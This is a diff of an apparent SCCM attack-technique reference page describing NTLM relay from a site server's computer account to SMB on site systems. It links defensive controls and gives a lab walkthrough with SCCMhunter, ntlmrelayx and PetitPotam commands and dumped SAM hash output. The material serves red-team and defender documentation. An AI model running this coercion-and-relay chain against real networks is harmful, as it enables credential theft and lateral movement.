@@ -1,6 +1,7 @@
 # ELEVATE-1
+
 ## Description
-NTLM relay site server SMB to SMB on site systems
+NTLM relay site server to SMB on site systems
 
 ## MITRE ATT&CK Tactics
 - [TA0008](https://attack.mitre.org/tactics/TA0008) - Lateral Movement
@@ -20,7 +21,7 @@ NTLM relay site server SMB to SMB on site systems
     - `RestrictSendingNTLMTraffic` = `0` or not present, or = `1` and `ClientAllowedNTLMServers` contains attacker relay server
 - Domain controller settings:
     - `RestrictNTLMInDomain` = `0` or not present, or is configured with any value and `DCAllowedNTLMServers` contains coercion target
-    - `LmCompatibilityLevel` < 5 or not present, or = `5` and LmCompatibilityLevel >= 3 on the coercion target
+    - `LmCompatibilityLevel` < `5` or not present, or = `5` and LmCompatibilityLevel >= `3` on the coercion target
 
 ### Relay
 - Relay target settings:
@@ -32,23 +33,23 @@ NTLM relay site server SMB to SMB on site systems
     - `RestrictNTLMInDomain` = `0` or not present, or is configured with any value and `DCAllowedNTLMServers` contains relay target
 
 ## Summary
-SCCM uses the site system installation account to install and maintain roles on new or existing site system servers. By default, this account is the site server machine account and requires [local administrative permissions](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/accounts#site-system-installation-account) for and network access to the target systems. An attacker could coerce NTLM authentication from the site server's host system and relay it to SMB on remote site systems in the same site to elevate their privileges and move laterally.
+SCCM uses the site system installation account to install and maintain roles on new or existing site system servers. By default, this account is the site server's domain compuper account and requires [local administrator permissions](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/accounts#site-system-installation-account) for and network access to the target systems. An attacker could coerce NTLM authentication from the site server's domain computer account and relay it to SMB on remote site systems in the same site to move laterally and elevate privileges.
 
 ## Impact
-Impact for these scenarios is difficult to quantify. In some cases a compromised site system role could lead to hierarchy takeover while in others a successful attack is simply a lateral movement opportunity. 
+Impact for these scenarios is difficult to quantify. In some cases a compromised site system role could lead to hierarchy takeover, while in others a successful attack is simply a lateral movement opportunity.
+
+## Defensive IDs
+- [DETECT-1: Monitor site server domain computer accounts authenticating from another source](../../../defense-techniques/DETECT/DETECT-1/detect-1_description.md)
+- [PREVENT-12: Require SMB signing on site systems](../../../defense-techniques/PREVENT/PREVENT-12/prevent-12_description.md)
+- [PREVENT-20: Block unnecessary connections to site systems](../../../defense-techniques/PREVENT/PREVENT-20/prevent-20_description.md)
+
 
 ## Subtechniques
 - ELEVATE-1.1: NTLM relay primary site server SMB to SMB on remote site systems
 - ELEVATE-1.2: NTLM relay passive site server SMB to SMB on remote site systems
 
-
-
-## Defensive IDs
-- [PREVENT-12: Require SMB signing on site systems](../../../defense-techniques/PREVENT/PREVENT-2/prevent-2_description.md)
-- [DETECT-1: Monitor site system computer accounts authenticating from a source that is not its static netbios name](../../../defense-techniques/DETECT/DETECT-1/detect-1_description.md)
-
 ## Examples
-1. On the attacker host, identify and profile SCCM assets with `SCCMhunter`. The output below is snipped from the output of the SMB module. From the results, *SCCM.INTERNAL.LAB* is identified as a site server in the *LAB* site with multiple hosts from the same site hosting various site system roles.
+1. On the attacker host, identify and profile SCCM assets with `SCCMhunter`. The output below is snipped from the output of the SMB module. From the results, *SCCM.INTERNAL.LAB* is identified as a site server in the *LAB* site with multiple hosts from the same site hosting various site system roles:
 
 ```
 [21:33:30] INFO     [+] Finished profiling all discovered computers.
@@ -81,7 +82,7 @@ Impact for these scenarios is difficult to quantify. In some cases a compromised
                     +-----------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+
 ```
 
-2. Start `ntlmrelayx` targeting all of the discovered *LAB* site systems.  For this example, no additional flags are provided and the tool will simply attempt to dump hashes on the target system.
+2. Start `ntlmrelayx`, targeting all of the discovered *LAB* site systems.  For this example, no additional flags are provided and the tool will simply attempt to dump hashes on the target system:
 
 ```
 └─# ntlmrelayx.py -tf sccm_lab_targets.txt  -smb2support
@@ -105,9 +106,9 @@ Impacket v0.12.0.dev1+20240130.154745.97007e84 - Copyright 2023 Fortra
 [*] Setting up RAW Server on port 6666
 ```
 
-3. Coerce authentication from the target site server to the attacker host's IP address.
+3. Coerce authentication from the target site server to the attacker host's IP address:
 ```
-└─# python3 PetitPotam.py -u lowpriv -p  10.10.100.136 10.10.100.9 -d internal.lab
+└─# python3 PetitPotam.py -u lowpriv -p x 10.10.100.136 10.10.100.9 -d internal.lab
 
 Trying pipe lsarpc
 [-] Connecting to ncacn_np:10.10.100.9[\PIPE\lsarpc]
@@ -123,7 +124,7 @@ Trying pipe lsarpc
 ```
 
 
-4. Authentication is captured and relayed in the context of the *SCCM.INTERNAL.LAB* site sever and SAM hashes recovered from the target systems
+4. Authentication is captured and relayed in the context of the *SCCM.INTERNAL.LAB* site sever and SAM hashes recovered from the target systems:
 ```
 [*] Servers started, waiting for connections
 [*] Received connection from LAB/SCCM$ at SCCM, connection will be relayed after re-authentication
@@ -172,6 +173,5 @@ WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6d27d961da4a806f274e042f
 ```
 
 ## References
-
-- Microsoft, Install site system roles for Configuration Manager, https://learn.microsoft.com/en-us/mem/configmgr/core/servers/deploy/configure/install-site-system-roles
-- Microsoft, Site system installation account, https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/accounts#site-system-installation-account
+- Microsoft, [Install site system roles for Configuration Manager](https://learn.microsoft.com/en-us/mem/configmgr/core/servers/deploy/configure/install-site-system-roles)
+- Microsoft, [Site system installation account](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/accounts#site-system-installation-account)
